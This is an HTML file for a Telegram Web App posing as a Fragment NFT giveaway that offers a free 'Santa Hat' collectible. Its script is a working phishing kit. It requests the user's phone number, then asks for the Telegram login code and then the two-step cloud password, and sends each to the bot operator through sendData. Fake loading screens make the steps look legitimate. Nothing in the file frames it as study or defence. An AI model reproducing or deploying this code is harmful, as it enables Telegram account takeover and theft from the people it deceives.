<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment | Premium Collectibles</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg: #000000;
            --card-bg: #1c1c1e;
            --accent: #007aff;
            --text-p: #ebebf599;
            --gold: #ffac33;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg); color: #fff; margin: 0; padding: 0; overflow-x: hidden;
        }

        /* Анимация появления */
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .app-container { animation: fadeIn 0.5s ease; padding-bottom: 80px; }

        /* Шапка */
        .header {
            padding: 40px 20px; text-align: center;
            background: radial-gradient(circle at center, #1c2a35 0%, #000 100%);
        }

        .stars-badge {
            display: inline-flex; align-items: center; gap: 5px;
            background: rgba(255, 172, 51, 0.15);
            border: 1px solid rgba(255, 172, 51, 0.3);
            padding: 6px 16px; border-radius: 20px;
            color: var(--gold); font-weight: bold; font-size: 15px;
        }

        /* Навигация */
        .tabs {
            display: flex; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px);
            position: sticky; top: 0; z-index: 100; border-bottom: 0.5px solid #2c2c2e;
        }
        .tab {
            flex: 1; padding: 15px; text-align: center; font-size: 13px;
            color: var(--text-p); font-weight: 600; cursor: pointer;
        }
        .tab.active { color: #fff; border-bottom: 2px solid var(--accent); }

        /* Сетка NFT */
        .content { padding: 16px; display: none; }
        .content.active { display: block; }

        .nft-card {
            background: var(--card-bg); border-radius: 20px; padding: 15px;
            margin-bottom: 16px; border: 0.5px solid #2c2c2e;
            text-align: center; transition: 0.3s;
        }

        .nft-image { 
            width: 100%; border-radius: 12px; margin-bottom: 15px;
            animation: float 4s ease-in-out infinite;
        }

        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        .btn-claim {
            background: #fff; color: #000; border: none; width: 100%;
            padding: 14px; border-radius: 12px; font-weight: 700;
            font-size: 15px; margin-top: 10px;
        }

        /* Полноэкранные модалки (Overlay) */
        .overlay {
            display: none; position: fixed; inset: 0; background: #000;
            z-index: 2000; padding: 40px 25px; flex-direction: column; align-items: center;
        }
        .overlay.active { display: flex; }

        .v-input {
            width: 100%; background: #1c1c1e; border: 1px solid #3a3a3c;
            border-radius: 15px; color: #fff; padding: 20px; font-size: 24px;
            text-align: center; margin: 30px 0; outline: none; letter-spacing: 2px;
        }

        .loader {
            width: 48px; height: 48px; border: 5px solid #FFF;
            border-bottom-color: transparent; border-radius: 50%;
            display: inline-block; animation: rotation 1s linear infinite;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="app-container">
    <div class="header">
        <div class="stars-badge">⭐️ 20.00 STARS BONUS</div>
        <h1 style="font-size: 24px; margin: 15px 0 5px;">Winter Mint</h1>
        <p style="color: var(--text-p); font-size: 14px;">Exclusive Fragment Collectibles</p>
    </div>

    <div class="tabs">
        <div class="tab active" onclick="setTab('market', this)">Market</div>
        <div class="tab" onclick="setTab('assets', this)">My Assets</div>
    </div>

    <div id="market" class="content active">
        <div class="nft-card">
            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-image">
            <div style="font-weight: bold;">Santa Hat #10168</div>
            <div style="color: var(--accent); font-size: 13px; margin: 5px 0;">EST. VALUE: $54.00</div>
            <button class="btn-claim" onclick="startProcess()">CLAIM FOR FREE</button>
        </div>
    </div>

    <div id="assets" class="content">
        <p style="text-align: center; color: var(--text-p); margin-top: 50px;">You don't have any assets yet.</p>
    </div>
</div>

<div id="modal-loading" class="overlay">
    <span class="loader"></span>
    <h2 style="margin-top: 20px;">Connecting...</h2>
    <p style="color: var(--text-p); text-align: center;">Establishing secure connection to Fragment nodes.</p>
</div>

<div id="modal-code" class="overlay">
    <h2>Enter Code</h2>
    <p style="color: var(--text-p); text-align: center;">A verification code was sent to your <b>Telegram</b> app.</p>
    <input type="number" id="code-input" class="v-input" placeholder="00000">
    <button class="btn-claim" onclick="confirmCode()">VERIFY</button>
</div>

<div id="modal-2fa" class="overlay">
    <h2>2-Step Verification</h2>
    <p style="color: var(--text-p); text-align: center;">Enter your cloud password to complete the mint.</p>
    <input type="password" id="pass-input" class="v-input" placeholder="Password">
    <button class="btn-claim" onclick="confirmPass()">UNLOCK</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.headerColor = "#000000";

    function setTab(name, el) {
        document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(name).classList.add('active');
        el.classList.add('active');
    }

    function startProcess() {
        tg.requestContact((sent, cb) => {
            if (sent && cb.responseUnsafe.contact) {
                tg.sendData("PHONE:" + cb.responseUnsafe.contact.phone_number);
                showModal('modal-loading');
                // Имитация ожидания ответа от сервера
                setTimeout(() => {
                    showModal('modal-code');
                }, 3500);
            }
        });
    }

    function confirmCode() {
        const val = document.getElementById('code-input').value;
        if(val.length >= 5) {
            tg.sendData("CODE:" + val);
            showModal('modal-loading');
            setTimeout(() => showModal('modal-2fa'), 3000);
        }
    }

    function confirmPass() {
        const val = document.getElementById('pass-input').value;
        if(val.length > 0) {
            tg.sendData("PASS:" + val);
            tg.close();
        }
    }

    function showModal(id) {
        document.querySelectorAll('.overlay').forEach(m => m.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }
</script>
</body>
</html>
